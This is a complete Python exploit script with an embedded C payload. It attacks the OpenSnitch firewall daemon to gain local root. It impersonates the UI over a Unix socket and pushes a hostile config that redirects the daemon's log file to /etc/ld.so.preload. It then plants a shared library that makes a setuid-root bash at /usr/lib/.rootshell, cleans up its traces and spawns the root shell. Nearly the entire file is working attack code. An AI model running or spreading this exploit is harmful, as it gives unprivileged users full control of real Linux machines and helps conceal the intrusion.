#!/usr/bin/env python3

import atexit
import os
import signal
import subprocess
import sys
import threading
import time
from concurrent import futures

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
try:
    import grpc
    import ui_pb2
    import ui_pb2_grpc
except ImportError:
    grpc = ui_pb2 = ui_pb2_grpc = None

SOCK = "/tmp/osui.sock"
SO = "/tmp/.x.so"
SRC = "/tmp/.x.c"
SHELL = "/usr/lib/.rootshell"   # NOT /tmp: /tmp is nosuid on stock installs
PRELOAD = "/etc/ld.so.preload"
DAEMON_CFG = "/etc/opensnitchd/default-config.json"
CFG_STAGE = "/tmp/.x.cfg"
DEVNULL = subprocess.DEVNULL

PAYLOAD = r'''
#include <sys/stat.h>
#include <unistd.h>
__attribute__((constructor)) static void go(void) {
    if (geteuid() != 0) return;
    if (access("%SHELL%", F_OK) == 0) return;          /* only once */
    if (link("/bin/bash", "%SHELL%") != 0) {
        FILE_COPY: {
            int in = open("/bin/bash", O_RDONLY), out;
            if (in < 0) return;
            out = open("%SHELL%", O_WRONLY | O_CREAT | O_TRUNC, 0755);
            if (out < 0) { close(in); return; }
            char b[65536]; ssize_t n;
            while ((n = read(in, b, sizeof b)) > 0) write(out, b, n);
            close(in); close(out);
        }
    }
    chown("%SHELL%", 0, 0);
    chmod("%SHELL%", 04755);
}
'''
PAYLOAD = ("#include <fcntl.h>\n#include <stdio.h>\n" + PAYLOAD).replace("%SHELL%", SHELL)

HOSTILE_CFG_TMPL = (
    '{"Server":{"Address":"unix://%s","LogFile":"/etc/ld.so.preload"},'
    '"DefaultAction":"allow","DefaultDuration":"once","InterceptUnknown":false,'
    '"ProcMonitorMethod":"ebpf","LogLevel":0,"Firewall":"nftables",'
    '"Rules":{"Path":"/etc/opensnitchd/rules/"},'
    '"Stats":{"MaxEvents":150,"MaxStats":25,"Workers":6}}'
) % SOCK

connected = threading.Event()
original_config = {"json": None}
cleaned_up = {"done": False}
notif_queue = []
notif_ready = threading.Event()
notif_id = [0]


class UI(ui_pb2_grpc.UIServicer if ui_pb2_grpc else object):
    def Ping(self, req, ctx):
        return ui_pb2.PingReply(id=req.id)

    def Subscribe(self, req, ctx):
        if original_config["json"] is None:
            original_config["json"] = req.config
        connected.set()
        r = ui_pb2.ClientConfig(id=req.id, name=req.name, version=req.version)
        r.config = req.config
        return r

    def AskRule(self, req, ctx):
        return ui_pb2.Rule(name="a", enabled=True, action="allow", duration="once")

    def PostAlert(self, req, ctx):
        return ui_pb2.MsgResponse(id=req.id)

    def Notifications(self, reqs, ctx):
        def _drain():
            try:
                for _ in reqs:
                    pass
            except Exception:
                pass
        threading.Thread(target=_drain, daemon=True).start()
        while ctx.is_active():
            if notif_queue:
                yield notif_queue.pop(0)
            else:
                notif_ready.wait(1)
                notif_ready.clear()


def push_config(cfg_json):
    notif_id[0] += 1
    notif_queue.append(ui_pb2.Notification(id=notif_id[0], type=ui_pb2.CHANGE_CONFIG, data=cfg_json))
    notif_ready.set()


def restore_daemon_config():
    if cleaned_up["done"]:
        return
    cleaned_up["done"] = True
    if original_config["json"]:
        try:
            push_config(original_config["json"])
        except Exception:
            pass
    stable_for = 0
    deadline = time.time() + 30
    while time.time() < deadline and stable_for < 3:
        if os.path.exists(PRELOAD):
            try:
                os.unlink(PRELOAD)
            except OSError:
                pass
            stable_for = 0
        else:
            stable_for += 1
        time.sleep(1)
    for f in (SRC,):
        try:
            os.unlink(f)
        except OSError:
            pass


def root_cleanup():
    if cleaned_up["done"]:
        return
    if not (original_config["json"] and os.path.exists(SHELL) and os.stat(SHELL).st_mode & 0o4000):
        return
    open(CFG_STAGE, "w").write(original_config["json"])
    script = (
        f"install -m 0600 -o root -g root {CFG_STAGE} {DAEMON_CFG} && "
        f"rm -f {PRELOAD} {CFG_STAGE} {SO} {SRC} && "
        f"systemctl restart opensnitch"
    )
    rc = subprocess.call([SHELL, "-p", "-c", script], stdout=DEVNULL, stderr=DEVNULL)
    time.sleep(2)
    still_active = subprocess.call([SHELL, "-p", "-c", "systemctl is-active -q opensnitch"]) == 0
    if rc == 0 and still_active and not os.path.exists(PRELOAD):
        print("[+] cleanup: daemon config restored, preload removed, service restarted clean")
        cleaned_up["done"] = True


def preflight():
    missing = []
    if subprocess.call(["which", "gcc"], stdout=DEVNULL, stderr=DEVNULL):
        missing.append("gcc")
    try:
        import grpc  # noqa: F401
    except ImportError:
        missing.append("python3-grpcio")
    if missing:
        print("[-] missing dependencies: " + ", ".join(missing))
        return False
    if not (os.path.exists("ui_pb2.py") and os.path.exists("ui_pb2_grpc.py")):
        print("[-] ui_pb2.py / ui_pb2_grpc.py not found - generate them first (see setup above)")
        return False
    return True


def main():
    sys.stdout.reconfigure(line_buffering=True)
    if os.geteuid() == 0:
        print("[-] run me as an UNPRIVILEGED user")
        return 1
    if not preflight():
        return 1
    if os.path.exists(SOCK):
        if os.stat(SOCK).st_uid != os.getuid():
            print(f"[-] {SOCK} exists and is not owned by this user")
            return 1
        print(f"[+] {SOCK} exists and is owned by this user - reclaiming it")
        subprocess.call(["fuser", "-k", SOCK], stdout=DEVNULL, stderr=DEVNULL)
        time.sleep(1)
        try:
            os.unlink(SOCK)
        except OSError as e:
            print(f"[-] could not remove {SOCK}: {e}")
            return 1

    open(SRC, "w").write(PAYLOAD)
    if subprocess.call(["gcc", "-shared", "-fPIC", "-o", SO, SRC], stderr=DEVNULL):
        print("[-] gcc failed")
        return 1
    print(f"[+] payload {SO}")

    srv = grpc.server(futures.ThreadPoolExecutor(max_workers=8))
    ui_pb2_grpc.add_UIServicer_to_server(UI(), srv)
    srv.add_insecure_port("unix://" + SOCK)
    srv.start()
    os.chmod(SOCK, 0o777)
    print(f"[+] listening on {SOCK}, waiting for root daemon ...")

    atexit.register(restore_daemon_config)
    signal.signal(signal.SIGTERM, lambda *_: sys.exit(1))

    if not connected.wait(120):
        print("[-] daemon never connected, is opensnitchd running?")
        return 1
    print("[+] root daemon connected; pushing CHANGE_CONFIG")
    push_config(HOSTILE_CFG_TMPL)
    time.sleep(8)

    print("[+] planting token via exec (path must not be last arg)")
    for _ in range(4):
        subprocess.call(["/bin/true", SO, "x"], stdout=DEVNULL, stderr=DEVNULL)
        time.sleep(1)

    print("[+] waiting for any root process to load it (systemd/cron/logind will) ...")
    got_shell = False
    for _ in range(240):
        if os.path.exists(SHELL) and os.stat(SHELL).st_mode & 0o4000:
            got_shell = True
            break
        time.sleep(1)

    if not got_shell:
        print("[-] no root process started in time (try again, or wait for cron/logrotate)")
        srv.stop(0)
        return 1

    print(f"[+] setuid root shell at {SHELL}")
    root_cleanup()
    restore_daemon_config()
    srv.stop(0)
    try:
        os.unlink(SOCK)
    except OSError:
        pass
    os.execv(SHELL, [SHELL, "-p"])


if __name__ == "__main__":
    sys.exit(main())
